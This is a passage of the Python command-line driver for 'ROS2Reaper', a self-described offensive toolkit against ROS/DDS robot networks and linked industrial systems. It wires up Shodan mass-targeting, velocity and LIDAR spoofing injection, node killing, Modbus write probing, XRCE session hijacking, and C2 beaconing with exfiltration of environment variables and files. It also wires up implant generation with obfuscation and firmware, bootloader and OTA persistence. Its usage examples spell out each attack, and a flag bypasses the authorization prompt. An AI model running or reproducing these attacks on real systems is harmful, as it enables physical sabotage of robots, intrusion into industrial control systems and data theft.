def cmd_shodan_dds(args):
    """Internet-wide DDS exposure search via Shodan"""
    from modules.phase3.shodan_dds import ShodanDDSScanner

    api_key = args.api_key or os.environ.get("SHODAN_API_KEY", "")
    if not api_key:
        print("[-] Shodan API key required: --api-key KEY or env SHODAN_API_KEY")
        return

    scanner = ShodanDDSScanner(api_key=api_key, rate_limit=args.rate)

    if args.target:
        # Single host deep lookup
        print(f"[*] Shodan host lookup: {args.target}")
        result = scanner.lookup_host(args.target)
        print(json.dumps(result, indent=2, default=str))
        if args.output:
            with open(args.output, "w") as f:
                json.dump(result, f, indent=2, default=str)
            print(f"[*] Result saved to {args.output}")
    else:
        # Full search campaign
        print(f"[*] Running Shodan DDS search campaign (limit {args.limit}/query)...")
        result = scanner.run_search_campaign(
            max_per_query=args.limit,
            context_filter=args.context,
        )
        if args.output:
            with open(args.output, "w") as f:
                json.dump(result.__dict__ if hasattr(result, "__dict__") else result,
                          f, indent=2, default=str)
            print(f"[*] Results saved to {args.output}")
        if args.export:
            hosts = []
            if hasattr(result, "hits"):
                hosts = [h.ip for h in result.hits if hasattr(h, "ip")]
            with open(args.export, "w") as f:
                f.write("\n".join(hosts))
            print(f"[*] {len(hosts)} IPs exported to {args.export}")




# =============================================================================
# Phase 5A: micro-ROS / XRCE Commands
# =============================================================================

def cmd_microros_agent(args):
    """Discover XRCE Agents and enumerate micro-ROS participants"""
    from modules.phase5a.microros_agent import XRCEAgentScanner, print_agent_report, export_json as p5_export

    scanner = XRCEAgentScanner(timeout=args.timeout, verbose=args.verbose)
    agents = []

    if args.network:
        agents = scanner.scan_range(args.network, port=args.agent_port, threads=args.threads)
    elif args.target:
        if args.xrce_multiport:
            agents = scanner.scan_multiport(args.target)
        else:
            agent = scanner.scan_port(args.target, args.agent_port)
            if agent:
                agents = [agent]
    else:
        print("[-] Specify --target or --network for microros-agent")
        return

    if args.xrce_enumerate:
        for agent in agents:
            participants = scanner.enumerate_participants(agent, timeout=args.timeout)
            agent.participants = [f"{p.session_id}:{p.participant_id}" for p in participants]

    print_agent_report(agents)

    if args.output:
        p5_export(agents, args.output)


def cmd_xrce_traffic(args):
    """Capture and analyze XRCE traffic for behavioral profiling"""
    from modules.phase5a.xrce_traffic_analysis import XRCETrafficAnalyzer, print_analysis_report, export_json as p5_export

    if not args.target:
        print("[-] --target required for xrce-traffic (XRCE Agent IP)")
        return

    analyzer = XRCETrafficAnalyzer(
        agent_ip=args.target,
        agent_port=args.agent_port,
        verbose=args.verbose,
    )

    print(f"[*] Capturing XRCE traffic from {args.target}:{args.agent_port} for {args.duration}s...")
    count = analyzer.capture(duration=args.duration)

    if count == 0:
        print("[!] No XRCE traffic captured")
        return

    stats = analyzer.analyze()
    print_analysis_report(stats)

    if args.output:
        p5_export(stats, args.output)

    if args.pcap:
        if analyzer.export_pcap(args.pcap):
            print(f"[+] PCAP exported to {args.pcap}")


def cmd_xrce_hijack(args):
    """Spoof XRCE client session and inject commands into topics"""
    from modules.phase5a.microros_client_hijack import XRCEClientHijacker, print_injection_report, export_json as p5_export

    if not args.target:
        print("[-] --target required for xrce-hijack (XRCE Agent IP)")
        return

    mode = args.xrce_attack or "twist"
    session_id = int(args.xrce_session, 0) if args.xrce_session else 0x42

    print(f"\n[*] XRCE hijack: {args.target}:{args.agent_port}  session={hex(session_id)}  mode={mode}")

    hijacker = XRCEClientHijacker(args.target, args.agent_port, verbose=args.verbose)
    if not hijacker.create_session(session_id=session_id):
        print("[!] Failed to create XRCE session")
        return

    results = []
    try:
        topic = args.topic or "/cmd_vel"
        if mode == "twist":
            results = hijacker.inject_twist(
                topic=topic,
                linear_x=args.lx if args.lx is not None else 1.0,
                angular_z=args.az if args.az is not None else 0.0,
                count=args.count,
                interval=args.interval,
            )
        elif mode == "nav":
            results = hijacker.inject_nav_goal(
                topic=args.topic or "/move_base_simple/goal",
                x=args.x,
                y=args.y,
                theta=args.theta,
                count=args.count,
                interval=args.interval,
            )
        elif mode == "raw":
            if args.payload_hex:
                payload = bytes.fromhex(args.payload_hex)
            elif args.payload_file:
                with open(args.payload_file, "r") as pf:
                    payload = bytes.fromhex(pf.read().strip())
            else:
                print("[!] Specify --payload-hex or --payload-file for raw mode")
                return
            results = hijacker.inject_raw(
                topic=topic,
                payload=payload,
                count=args.count,
                interval=args.interval,
            )
        else:
            print(f"[!] Unknown xrce-hijack mode: {mode}  (use twist, nav, raw)")
            return
    finally:
        hijacker.cleanup()

    print_injection_report(results)

    if args.output:
        p5_export(results, hijacker.session, args.output)


def cmd_uros_implant(args):
    """Generate micro-ROS C2 implant source (C++/Arduino/Python)"""
    from modules.phase5a.microros_implant import ImplantGenerator, ImplantConfig, print_generation_report

    if not args.platform:
        print("[-] --platform required for uros-implant  (cpp, arduino, python)")
        return

    config = ImplantConfig(
        implant_id=args.implant_id or "",
        target_platform=args.platform,
        beacon_interval=args.beacon_interval,
        beacon_topic=args.beacon_topic,
        command_topic=args.command_topic,
        obfuscate=args.obfuscate,
        add_decoy_code=args.add_decoy,
    )

    generator = ImplantGenerator(verbose=args.verbose)
    metadata = generator.generate(config)
    print_generation_report(metadata)

    if args.manifest:
        generator.export_manifest(args.manifest)


def cmd_uros_persist(args):
    """Firmware-level persistence mechanisms for micro-ROS targets"""
    from modules.phase5a.microros_persistence import MicroROSPersistence, PersistenceConfig, print_persistence_report, export_json as p5_export

    if not args.persist_method:
        print("[-] --persist-method required  (library_patch, bootloader, firmware_inject, partition, ota_hijack)")
        return
    if not args.target and args.persist_method != "ota_hijack":
        print("[-] --target required for uros-persist (firmware/library path)")
        return

    implant_code = b""
    if args.implant_file:
        with open(args.implant_file, "rb") as f:
            implant_code = f.read()
    elif args.implant_hex:
        implant_code = bytes.fromhex(args.implant_hex)

    config = PersistenceConfig(
        method=args.persist_method,
        target_path=args.target or "",
        implant_code=implant_code,
        implant_id=args.implant_id or "",
        bootloader_hook_addr=int(args.hook_address, 0) if args.hook_address else None,
        partition_name=args.partition_name,
        ota_server=args.ota_server,
        preserve_timestamps=True,
    )

    persistence = MicroROSPersistence(verbose=args.verbose)

    result = None
    m = args.persist_method
    if m == "library_patch":
        result = persistence.library_patch(config)
    elif m == "bootloader":
        result = persistence.bootloader_hook(config)
    elif m == "firmware_inject":
        result = persistence.firmware_inject(config)
    elif m == "partition":
        result = persistence.partition_hijack(config)
    elif m == "ota_hijack":
        result = persistence.ota_hijack_config(config)

    if result:
        print_persistence_report(result)

    if args.output:
        p5_export(persistence.results, args.output)


def cmd_uros_c2(args):
    """Phase 5A C2 dispatcher -- operator console for micro-ROS implants"""
    from modules.phase5a.c2_dispatcher import C2Dispatcher, DispatcherConfig, DispatcherCLI

    config = DispatcherConfig(
        c2_callback_ip=args.target,
        c2_callback_port=args.dispatcher_port,
        beacon_timeout_seconds=args.beacon_timeout,
        log_file=args.log_file,
        log_level="DEBUG" if args.verbose else "INFO",
    )

    dispatcher = C2Dispatcher(config, verbose=args.verbose)

    if args.batch_file:
        try:
            with open(args.batch_file, "r") as bf:
                for line in bf:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    print(f">>> {line}")
                    print(dispatcher.execute_command(line))
        except Exception as e:
            print(f"[!] Batch error: {e}")
    else:
        cli = DispatcherCLI(dispatcher)
        cli.run()

    if args.export_session:
        dispatcher.export_session(args.export_session)

# =============================================================================
# Output Formatters
# =============================================================================

def print_participants(participants):
    """Pretty-print discovered participants"""
    if not participants:
        print("\n[-] No DDS participants discovered")
        return

    print(f"\n\033[92m[+] Discovered {len(participants)} DDS participant(s):\033[0m\n")

    for i, p in enumerate(participants, 1):
        sec_status = "\033[92m🔒 SECURED\033[0m" if p.has_security else "\033[91m🔓 UNSECURED\033[0m"
        print(f"  [{i}] {p.vendor_name}")
        print(f"      GUID:     {p.guid_prefix_hex()}")
        print(f"      Source:   {p.source_ip}:{p.source_port}")
        if p.participant_name:
            print(f"      Name:     {p.participant_name}")
        if p.domain_id is not None:
            print(f"      Domain:   {p.domain_id}")
        print(f"      Version:  RTPS {p.protocol_version}")
        print(f"      Security: {sec_status}")
        if p.unicast_locators:
            locs = ", ".join(str(l) for l in p.unicast_locators[:3])
            print(f"      Locators: {locs}")
        print()


def print_scan_result(result: ScanResult):
    """Pretty-print a network scan result"""
    print(f"\n{'=' * 50}")
    print(f"  Scan: {result.scan_type}")
    print(f"  Target: {result.target}")
    print(f"  Domain: {result.domain_id}")
    print(f"  Duration: {result.duration_sec:.1f}s")
    print(f"  Found: {len(result.participants)} participant(s)")
    print(f"{'=' * 50}")

    print_participants(result.participants)

    if result.errors:
        print(f"\n[!] Errors encountered: {len(result.errors)}")
        for err in result.errors[:5]:
            print(f"    - {err}")


def print_fingerprint(fp):
    """Pretty-print a fingerprint"""
    from modules.fingerprint import DDSFingerprint

    sec_icon = "🔒" if fp.dds_security_enabled else "🔓"
    conf_bar = "█" * int(fp.confidence * 10) + "░" * (10 - int(fp.confidence * 10))

    print(f"  ┌─ \033[96m{fp.vendor_name}\033[0m")
    print(f"  │  GUID:       {fp.guid_prefix}")
    if fp.rmw_implementation:
        print(f"  │  RMW:        {fp.rmw_implementation}")
    if fp.ros2_distro:
        print(f"  │  ROS 2:      {fp.ros2_distro}")
    if fp.ros2_node_name:
        print(f"  │  Node:       {fp.ros2_node_name}")
    if fp.deployment_type:
        print(f"  │  Type:       {fp.deployment_type}")
    if fp.os_hint:
        print(f"  │  Host:       {fp.os_hint}")
    print(f"  │  Security:   {sec_icon} {'Enabled' if fp.dds_security_enabled else 'DISABLED'}")
    if fp.sros2_enabled:
        print(f"  │  SROS2:      ✅ Enabled")
    print(f"  │  Confidence: [{conf_bar}] {fp.confidence:.0%}")

    if fp.risk_factors:
        print(f"  │  \033[91mRisks:\033[0m")
        for risk in fp.risk_factors:
            color = "\033[91m" if "CRITICAL" in risk else (
                "\033[93m" if "HIGH" in risk else "\033[90m"
            )
            print(f"  │    {color}• {risk}\033[0m")

    print(f"  └{'─' * 50}")
    print()


def print_fingerprint_summary(summary: dict):
    """Print the summary section of a fingerprint report"""
    print(f"\n{'=' * 50}")
    print(f"  FINGERPRINT SUMMARY")
    print(f"{'=' * 50}")
    print(f"  Total Participants: {summary['total_participants']}")
    print(f"  Vendors: {summary['vendors']}")
    print(f"  Deployment Types: {summary['deployment_types']}")
    sec = summary['security_posture']
    print(f"  Security: {sec['secured']} secured, {sec['unsecured']} unsecured")
    risks = summary['risk_summary']
    print(f"  Risks: {risks['critical']} critical, {risks['high']} high, "
          f"{risks['medium']} medium, {risks['low']} low")
    print(f"{'=' * 50}")


def print_ros1_system(system):
    """Pretty-print a ROS1System enumeration result."""
    from modules.ros1_enum import SECURITY_CRITICAL_TOPICS, EOL_DISTROS

    distro_str = system.ros_distro or "unknown"
    eol_note = ""
    if distro_str.lower() in EOL_DISTROS:
        eol_note = f"  \033[91m[{EOL_DISTROS[distro_str.lower()]}]\033[0m"

    print(f"\n{'=' * 60}")
    print(f"  ROS1 SYSTEM — {system.master_uri}")
    print(f"{'=' * 60}")
    print(f"  Distro:   {distro_str}{eol_note}")
    print(f"  Version:  {system.ros_version or 'unknown'}")
    print(f"  Nodes:    {len(system.nodes)}")
    print(f"  Topics:   {len(system.topics)}")
    print(f"  Services: {len(system.services)}")
    print(f"  Params:   {len(system.parameters)}")
    print(f"{'─' * 60}")

    # Nodes
    if system.nodes:
        print(f"\n  \033[96mNODES ({len(system.nodes)})\033[0m")
        for node in system.nodes:
            host_str = f" @ {node.host}:{node.port}" if node.host else ""
            print(f"    \033[92m{node.name}\033[0m{host_str}")
            if node.topics_pub:
                print(f"      pubs:  {', '.join(node.topics_pub[:5])}"
                      + (" ..." if len(node.topics_pub) > 5 else ""))
            if node.topics_sub:
                print(f"      subs:  {', '.join(node.topics_sub[:5])}"
                      + (" ..." if len(node.topics_sub) > 5 else ""))

    # Topics — flag critical ones
    if system.topics:
        print(f"\n  \033[96mTOPICS ({len(system.topics)})\033[0m")
        for topic in system.topics:
            flag = "\033[91m ⚠ CRITICAL\033[0m" if topic.is_security_critical else ""
            type_str = f"  [{topic.type_name}]" if topic.type_name else ""
            print(f"    {topic.name}{type_str}{flag}")

    # Parameters (top-level keys only)
    if system.parameters:
        print(f"\n  \033[96mPARAMETERS (top-level)\033[0m")
        for key in sorted(system.parameters.keys())[:20]:
            val = system.parameters[key]
            val_str = str(val)[:60] + "..." if len(str(val)) > 60 else str(val)
            print(f"    {key}: {val_str}")
        if len(system.parameters) > 20:
            print(f"    ... and {len(system.parameters) - 20} more")

    print(f"\n{'=' * 60}\n")


def _print_params(params, indent: int = 2):
    """Recursively print a parameter dict."""
    prefix = " " * indent

    def _walk(obj, pfx):
        if isinstance(obj, dict):
            for k, v in sorted(obj.items()):
                if isinstance(v, dict):
                    print(f"{pfx}{k}:")
                    _walk(v, pfx + "  ")
                else:
                    val_str = str(v)[:80] + "..." if len(str(v)) > 80 else str(v)
                    print(f"{pfx}{k}: {val_str}")
        else:
            print(f"{pfx}{obj}")

    _walk(params, prefix)


# =============================================================================
# Helpers
# =============================================================================

def parse_domain_range(domain_str: str) -> list:
    """Parse domain range string like '0-10' or '0,1,5,42'"""
    if "-" in domain_str:
        start, end = domain_str.split("-", 1)
        return list(range(int(start), int(end) + 1))
    elif "," in domain_str:
        return [int(d.strip()) for d in domain_str.split(",")]
    else:
        return [int(domain_str)]


def confirm_authorization():
    """Require explicit authorization confirmation"""
    print(LEGAL_NOTICE)
    try:
        response = input("\033[93mDo you have authorization to test the target system? (yes/no): \033[0m")
        if response.lower() not in ("yes", "y"):
            print("\n[!] Exiting. Only test systems you are authorized to assess.")
            sys.exit(0)
    except (KeyboardInterrupt, EOFError):
        print("\n[!] Exiting.")
        sys.exit(0)


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="ROS2Reaper — DDS/RTPS Offensive Security Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Phase 1: Reconnaissance
  python3 ros2reaper.py discover --network 192.168.1.0/24
  python3 ros2reaper.py fingerprint --target 192.168.1.100
  python3 ros2reaper.py portscan --target 192.168.1.100 --domains 0-10
  python3 ros2reaper.py enumerate --target 192.168.1.100
  python3 ros2reaper.py audit --target 192.168.1.100 -o audit.json
  python3 ros2reaper.py full --network 192.168.1.0/24 -o report.json

  # Phase 2: Exploitation (run from attacker container)
  python3 ros2reaper.py inject --namespace /robot1 --preset spin --duration 10
  python3 ros2reaper.py inject --attack-mode lidar --namespace /robot1 --lidar-mode allclear
  python3 ros2reaper.py inject --attack-mode nav --namespace /robot1 --x 10 --y 5
  python3 ros2reaper.py inject --attack-mode swarm --namespaces /robot1 /robot2 --x 5 --y 5
  python3 ros2reaper.py impersonate --attack-mode tf --target-node fake_robot_1 --namespace /robot1
  python3 ros2reaper.py impersonate --attack-mode sybil --namespace /robot1 --count 20
  python3 ros2reaper.py amplify --target 172.20.0.10 --attack-mode full_suite

  # ROS 1 (target = rosmaster IP)
  python3 ros2reaper.py ros1-discover --target 192.168.1.10 --skip-auth -v
  python3 ros2reaper.py ros1-audit    --target 192.168.1.10 --skip-auth -o audit.json
  python3 ros2reaper.py ros1-inject   --target 192.168.1.10 --topic /cmd_vel --preset spinout --duration 10 --skip-auth
  python3 ros2reaper.py ros1-inject   --target 192.168.1.10 --attack-mode lidar --topic /scan --duration 10 --skip-auth
  python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --node /turtlesim --skip-auth
  python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --kill-all --skip-auth
  python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --param-key /max_speed --param-value 0.1 --skip-auth

  # rosbridge / WebSocket (no ROS install needed)
  python3 ros2reaper.py rb-enum    --target 192.168.1.10 --skip-auth
  python3 ros2reaper.py rb-audit   --target 192.168.1.10 --skip-auth -o rb_audit.json
  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --preset spin --duration 10 --skip-auth
  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --attack-mode lidar --lidar-mode allclear --skip-auth
  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --attack-mode nav --x 10 --y 5 --skip-auth
  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --rb-port 9090 --topic /cmd_vel --preset fullspeed --skip-auth

  # Phase 3: ICS/OT Bridge Analysis
  python3 ros2reaper.py ics-enum   --target 10.0.0.1 --deep --context scada --skip-auth
  python3 ros2reaper.py ics-enum   --network 10.0.0.0/24 --deep -o ics.json --skip-auth
  python3 ros2reaper.py ics-enum   --passive --passive-duration 60 --skip-auth
  python3 ros2reaper.py modbus-scan --target 10.0.0.1 --deep --modbus-enumerate --skip-auth
  python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 -o modbus.json --skip-auth
  python3 ros2reaper.py mqtt-scan  --target 10.0.0.1 --deep --mqtt-enumerate --skip-auth
  python3 ros2reaper.py mqtt-scan  --network 10.0.0.0/24 -o mqtt.json --skip-auth
  python3 ros2reaper.py opcua-scan --target 10.0.0.1 --deep --enumerate-nodes --skip-auth
  python3 ros2reaper.py opcua-scan --network 10.0.0.0/24 -o opcua.json --skip-auth
  python3 ros2reaper.py aws-scan   --target 10.0.0.1 --deep --shadow-enumerate --skip-auth
  python3 ros2reaper.py aws-scan   --network 10.0.0.0/24 -o aws.json --skip-auth
  python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --context scada -o shodan.json --skip-auth
  python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --target 1.2.3.4 --skip-auth
  python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --export targets.txt --skip-auth

  # Phase 4: Post-Exploitation / C2 (covert channel over DDS)
  python3 ros2reaper.py c2-server --domain-id 0 --skip-auth                          # operator side
  python3 ros2reaper.py c2-beacon --target 10.0.0.1 --c2-interval 20 --skip-auth    # on compromised host
  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode env --skip-auth    # exfil env vars
  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode files --exfil-path /etc/hosts --skip-auth
  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode topic --topic /camera/image_raw --skip-auth
  python3 ros2reaper.py c2-recv   --c2-session <session_id> -o exfil_out.bin --skip-auth
        """,
    )

    parser.add_argument("command",
                        choices=["discover", "fingerprint", "portscan", "listen",
                                 "enumerate", "audit", "full", "portcalc",
                                 # Phase 2: Exploitation (ROS 2)
                                 "inject", "impersonate", "amplify",
                                 # ROS 1
                                 "ros1-discover", "ros1-inject",
                                 "ros1-exploit", "ros1-audit",
                                 # rosbridge / WebSocket
                                 "rb-enum", "rb-inject", "rb-audit",
                                 # Phase 3: ICS/OT Bridge Analysis
                                 "ics-enum", "modbus-scan", "mqtt-scan",
                                 "opcua-scan", "aws-scan", "shodan-dds",
                                 # Phase 4: Post-Exploitation / C2
                                 "c2-server", "c2-beacon", "c2-exfil", "c2-recv",
                                 # Phase 5A: micro-ROS / XRCE
                                 "microros-agent", "xrce-traffic", "xrce-hijack",
                                 "uros-implant", "uros-persist", "uros-c2"],
                        help="Command to execute")

    # Target options
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-n", "--network", help="Target network (CIDR notation)")
    parser.add_argument("-d", "--domain-id", type=int, default=0,
                        help="DDS Domain ID (default: 0)")
    parser.add_argument("--domains", default="0-10",
                        help="Domain ID range for port scan (e.g., '0-10' or '0,1,5')")

    # Scan options
    parser.add_argument("--timeout", type=float, default=3.0,
                        help="Timeout in seconds (default: 3.0)")
    parser.add_argument("--duration", type=float, default=30.0,
                        help="Listen duration in seconds (default: 30.0)")

    # Phase 2: Injection/attack options
    parser.add_argument("--namespace", "-ns", default="/robot1",
                        help="ROS 2 namespace for injection attacks (default: /robot1)")
    parser.add_argument("--preset", default="spin",
                        choices=["spin", "fullspeed", "reverse", "erratic", "estop", "circle"],
                        help="Attack preset for cmd_vel injection")
    parser.add_argument("--attack-mode", default=None,
                        choices=["cmd_vel", "lidar", "nav", "odom", "swarm",
                                 "shadow", "tf", "dos", "sybil",
                                 "reflect", "exhaust", "fuzz", "heartbeat", "full_suite"],
                        help="Specific attack mode within a module")
    parser.add_argument("--namespaces", nargs="+", default=["/robot1", "/robot2"],
                        help="Target namespaces for swarm attack")
    parser.add_argument("--target-node", default=None,
                        help="Target node name for impersonation")
    parser.add_argument("--x", type=float, default=5.0, help="X coordinate for nav goal")
    parser.add_argument("--y", type=float, default=5.0, help="Y coordinate for nav goal")
    parser.add_argument("--lx", type=float, default=None,
                        help="Override linear.x velocity for cmd_vel injection (m/s)")
    parser.add_argument("--az", type=float, default=None,
                        help="Override angular.z velocity for cmd_vel injection (rad/s)")
    parser.add_argument("--lidar-mode", default="allclear",
                        choices=["allclear", "wall", "phantom"],
                        help="LIDAR spoofing mode")
    parser.add_argument("--count", type=int, default=50,
                        help="Count for exhaustion/sybil attacks")

    # rosbridge options
    parser.add_argument("--rb-port", type=int, default=9090,
                        help="rosbridge WebSocket port (default: 9090)")

    # ROS1 options
    parser.add_argument("--ros1-port", type=int, default=11311,
                        help="rosmaster port (default: 11311)")
    parser.add_argument("--node", default=None,
                        help="ROS1 node name for kill operations (e.g. /turtlesim)")
    parser.add_argument("--topic", default=None,
                        help="ROS1 topic for injection (e.g. /cmd_vel)")
    parser.add_argument("--param-key", default=None,
                        help="Parameter server key (e.g. /robot_description)")
    parser.add_argument("--param-value", default=None,
                        help="Parameter server value to write (string; int/float auto-cast)")
    parser.add_argument("--kill-all", action="store_true",
                        help="Kill all nodes on the ROS1 master")

    # Phase 3: ICS/OT options
    parser.add_argument("--threads", type=int, default=50,
                        help="Concurrent scan threads for Phase 3 modules (default: 50)")
    parser.add_argument("--passive", action="store_true",
                        help="Passive multicast listener mode (ics-enum, no probes sent)")
    parser.add_argument("--passive-duration", type=float, default=30.0,
                        dest="passive_duration",
                        help="Passive listen duration in seconds (default: 30.0)")
    parser.add_argument("--deep", action="store_true",
                        help="Enable deep probing / protocol coexistence detection")
    parser.add_argument("--context",
                        choices=["scada", "atc", "automotive", "smart_grid",
                                 "military", "medical", "iiot"],
                        default=None,
                        help="ICS sector context bias for classification/filtering")
    parser.add_argument("--modbus-enumerate", action="store_true",
                        dest="modbus_enumerate",
                        help="Enumerate Modbus unit IDs and test write access")
    parser.add_argument("--mqtt-enumerate", action="store_true",
                        dest="mqtt_enumerate",
                        help="Full MQTT wildcard topic enumeration (requires paho-mqtt)")
    parser.add_argument("--enum-duration", type=float, default=10.0,
                        dest="enum_duration",
                        help="MQTT topic listen duration in seconds (default: 10.0)")
    parser.add_argument("--enumerate-nodes", action="store_true",
                        dest="enumerate_nodes",
                        help="Browse OPC UA address space for DDS bridge indicators")
    parser.add_argument("--shadow-enumerate", action="store_true",
                        dest="shadow_enumerate",
                        help="Probe AWS IoT Shadow/Jobs topics on discovered brokers")
    parser.add_argument("--api-key", default=None,
                        help="Shodan API key (or set env SHODAN_API_KEY)")
    parser.add_argument("--limit", type=int, default=100,
                        help="Max Shodan results per query (default: 100)")
    parser.add_argument("--rate", type=float, default=1.0,
                        help="Seconds between Shodan API calls (default: 1.0)")
    parser.add_argument("--export", default=None,
                        help="Export IP list from Shodan results to file")

    # Phase 4: C2 options
    parser.add_argument("--c2-key", default=None,
                        help="C2 channel XOR key (default: built-in key)")
    parser.add_argument("--c2-session", default=None,
                        dest="c2_session",
                        help="C2 session ID (for c2-recv / c2-exfil)")
    parser.add_argument("--c2-interval", type=float, default=30.0,
                        dest="c2_interval",
                        help="Beacon check-in interval in seconds (default: 30.0)")
    parser.add_argument("--c2-ttl", type=int, default=0,
                        dest="c2_ttl",
                        help="Beacon max check-ins before self-termination (0=forever)")
    parser.add_argument("--exfil-mode",
                        choices=["topic", "params", "files", "env"],
                        default=None,
                        dest="exfil_mode",
                        help="Exfil data source: topic, params, files, env")
    parser.add_argument("--exfil-path", default=None,
                        dest="exfil_path",
                        help="File path for exfil mode=files")

    # Phase 5A: micro-ROS / XRCE options
    parser.add_argument("--agent-port", type=int, default=8888, dest="agent_port",
                        help="XRCE Agent UDP port (default: 8888)")
    parser.add_argument("--xrce-multiport", action="store_true", dest="xrce_multiport",
                        help="Scan common XRCE ports (8888, 7400-7409)")
    parser.add_argument("--xrce-enumerate", action="store_true", dest="xrce_enumerate",
                        help="Enumerate participants on discovered XRCE Agents")
    parser.add_argument("--pcap", default=None,
                        help="Export XRCE captured traffic to PCAP file")
    parser.add_argument("--xrce-attack", choices=["twist", "nav", "raw"],
                        default=None, dest="xrce_attack",
                        help="XRCE hijack attack type: twist, nav, raw")
    parser.add_argument("--xrce-session", default=None, dest="xrce_session",
                        help="XRCE spoofed session ID (hex, default: 0x42)")
    parser.add_argument("--theta", type=float, default=0.0,
                        help="Nav goal orientation in radians (default: 0.0)")
    parser.add_argument("--interval", type=float, default=0.1,
                        help="Delay between XRCE injections in seconds (default: 0.1)")
    parser.add_argument("--payload-file", default=None, dest="payload_file",
                        help="File containing raw XRCE payload (hex text)")
    parser.add_argument("--payload-hex", default=None, dest="payload_hex",
                        help="Raw XRCE payload as hex string")
    parser.add_argument("--platform", choices=["cpp", "arduino", "python"],
                        default=None,
                        help="Implant target platform (cpp, arduino, python)")
    parser.add_argument("--implant-id", default=None, dest="implant_id",
                        help="Implant ID (auto-generated if not specified)")
    parser.add_argument("--beacon-interval", type=int, default=5000, dest="beacon_interval",
                        help="Implant beacon interval in ms (default: 5000)")
    parser.add_argument("--beacon-topic", default="/implant/beacon", dest="beacon_topic",
                        help="Implant beacon topic base (default: /implant/beacon)")
    parser.add_argument("--command-topic", default="/implant/command", dest="command_topic",
                        help="Implant command topic base (default: /implant/command)")
    parser.add_argument("--obfuscate", action="store_true",
                        help="Strip comments from generated implant source")
    parser.add_argument("--add-decoy", action="store_true", dest="add_decoy",
                        help="Add decoy code to generated implant")
    parser.add_argument("--manifest", default=None,
                        help="Export implant manifest JSON to file")
    parser.add_argument("--persist-method",
                        choices=["library_patch", "bootloader", "firmware_inject",
                                 "partition", "ota_hijack"],
                        default=None, dest="persist_method",
                        help="Persistence mechanism for uros-persist")
    parser.add_argument("--implant-file", default=None, dest="implant_file",
                        help="Binary file containing implant shellcode")
    parser.add_argument("--implant-hex", default=None, dest="implant_hex",
                        help="Implant shellcode as hex string")
    parser.add_argument("--hook-address", default=None, dest="hook_address",
                        help="Bootloader hook address (hex, e.g. 0x08000100)")
    parser.add_argument("--partition-name", default=None, dest="partition_name",
                        help="Partition name for ESP32 partition hijack")
    parser.add_argument("--ota-server", default=None, dest="ota_server",
                        help="OTA server hostname/IP for OTA hijack config")
    parser.add_argument("--dispatcher-port", type=int, default=None, dest="dispatcher_port",
                        help="Phase 5A dispatcher callback port")
    parser.add_argument("--beacon-timeout", type=float, default=60.0, dest="beacon_timeout",
                        help="Implant beacon timeout in seconds (default: 60.0)")
    parser.add_argument("--log-file", default=None, dest="log_file",
                        help="Dispatcher log file path")
    parser.add_argument("--export-session", default=None, dest="export_session",
                        help="Export dispatcher session state to JSON file")
    parser.add_argument("--batch-file", default=None, dest="batch_file",
                        help="Execute dispatcher commands from file (non-interactive)")

    # Output options
    parser.add_argument("-o", "--output", help="Output file path (JSON)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("--no-banner", action="store_true",
                        help="Suppress banner")
    parser.add_argument("--skip-auth", action="store_true",
                        help="Skip authorization confirmation (for scripting)")

    args = parser.parse_args()

    # Banner
    if not args.no_banner:
        print(BANNER)

    # Authorization check
    if not args.skip_auth and args.command not in ("portcalc",):
        confirm_authorization()

    # Dispatch commands
    commands = {
        "discover":      cmd_discover,
        "fingerprint":   cmd_fingerprint,
        "portscan":      cmd_portscan,
        "listen":        cmd_listen,
        "full":          cmd_full,
        "portcalc":      cmd_portcalc,
        "enumerate":     cmd_enumerate,
        "audit":         cmd_audit,
        # Phase 2: Exploitation (ROS 2)
        "inject":        cmd_inject,
        "impersonate":   cmd_impersonate,
        "amplify":       cmd_amplify,
        # ROS 1
        "ros1-discover": cmd_ros1_discover,
        "ros1-inject":   cmd_ros1_inject,
        "ros1-exploit":  cmd_ros1_exploit,
        "ros1-audit":    cmd_ros1_audit,
        # rosbridge / WebSocket
        "rb-enum":       cmd_rb_enum,
        "rb-inject":     cmd_rb_inject,
        "rb-audit":      cmd_rb_audit,
        # Phase 3: ICS/OT Bridge Analysis
        "ics-enum":      cmd_ics_enum,
        "modbus-scan":   cmd_modbus_scan,
        "mqtt-scan":     cmd_mqtt_scan,
        "opcua-scan":    cmd_opcua_scan,
        "aws-scan":      cmd_aws_scan,
        "shodan-dds":    cmd_shodan_dds,
        # Phase 4: Post-Exploitation / C2
        "c2-server":     cmd_c2_server,
        "c2-beacon":     cmd_c2_beacon,
        "c2-exfil":      cmd_c2_exfil,
        "c2-recv":       cmd_c2_recv,
        # Phase 5A: micro-ROS / XRCE
        "microros-agent": cmd_microros_agent,
        "xrce-traffic":   cmd_xrce_traffic,
        "xrce-hijack":    cmd_xrce_hijack,
        "uros-implant":   cmd_uros_implant,
        "uros-persist":   cmd_uros_persist,
        "uros-c2":        cmd_uros_c2,
    }

    try:
        commands[args.command](args)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
